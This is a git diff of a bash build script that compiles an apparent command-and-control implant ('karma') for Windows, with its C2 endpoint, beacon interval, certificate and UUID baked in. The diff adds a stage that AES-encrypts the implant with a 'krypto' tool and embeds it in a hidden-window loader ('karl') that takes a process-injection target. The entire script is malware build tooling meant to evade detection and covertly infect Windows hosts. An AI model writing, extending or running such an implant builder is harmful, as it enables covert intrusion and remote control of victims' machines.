@@ -1,19 +1,19 @@
 #!/bin/bash
 set -e
 
-GOARCH=$1
-C2=$2
-WAITSEC=$3
-CERT=$4
-KEY=$5
-AESKEY=$6 # rest are base32 encoded
-X1=$7 
-X2=$8
-UUID=$9
-PACKER=${10}
-OUTFILE=${11}
+C2=$1
+WAITSEC=$2
+CERT=$3
+KEY=$4
+AESKEY=$5
+X1=$6 
+X2=$7
+UUID=$8
+PACKER=$9
+OUTFILE=${10}
+INJECT=${11}
 
-LDFLAGS=(
+LDFLAGS_KARMA=(
     "-X 'main.InitC2Endpoint=${C2}'"
     "-X 'main.InitWaitSeconds=${WAITSEC}'"
     "-X 'main.InitUUID=${UUID}'"
@@ -28,20 +28,51 @@ LDFLAGS=(
     "-w"
 )
 
+LDFLAGS_KARL=(
+    "-X 'main.aeskey=${AESKEY}'"
+    "-X 'main.X1=${X1}'"
+    "-X 'main.X2=${X2}'"
+    "-X 'main.Target=${INJECT}'"
+    "-H=windowsgui"
+    "-s"
+    "-w"
+)
+
 OLDDIR=$PWD
 
 if [ ! -z "$OUTFILE" ]; then
     LOCATION=$OUTFILE
-    OUTFILE="-o ${OUTFILE}"
+    OUTFILE="-o $OUTFILE"
 fi
 
 cd $(dirname $0)
-GOOS=windows GOARCH=${GOARCH} go build -ldflags="${LDFLAGS[*]}" ${OUTFILE}
+GOOS=windows GOARCH=amd64 go build -ldflags="${LDFLAGS_KARMA[*]}" -o karma.exe
 
+mv karma.exe ../karl && cd ../karl
 
-if [ -z "$OUTFILE" ]; then
-    LOCATION=$OLDDIR/bin
-    mkdir -p $LOCATION
-    mv karma* $LOCATION
+# Encrypt karma binary before packing into karl
+$HOME/.kbin/krypto karma.exe $AESKEY $X1 $X2
+
+# Encrypted binary is embedded as byte array during compilation
+GOOS=windows GOARCH=amd64 go build -ldflags="${LDFLAGS_KARL[*]}" $OUTFILE
+rm karma.exe
+
+if [ -z $OUTFILE ]; then
+    OUTFILE=karl.exe
 fi
-echo "'karma' instance saved at $LOCATION"
+
+if [ ! -z $LOCATION ]; then
+    if [ "$(dirname $LOCATION)" == "." ]; then
+        OUTFILE=$LOCATION
+    fi
+fi
+
+if [ "$OUTFILE" == "karl.exe" ] || [ "$OUTFILE" == "$LOCATION" ]; then
+    mkdir -p $OLDDIR/bin 2>/dev/null
+    mv $OUTFILE $OLDDIR/bin
+    LOCATION=$OLDDIR/bin/$OUTFILE
+fi
+
+cd $OLDDIR
+
+echo "saved to $LOCATION"
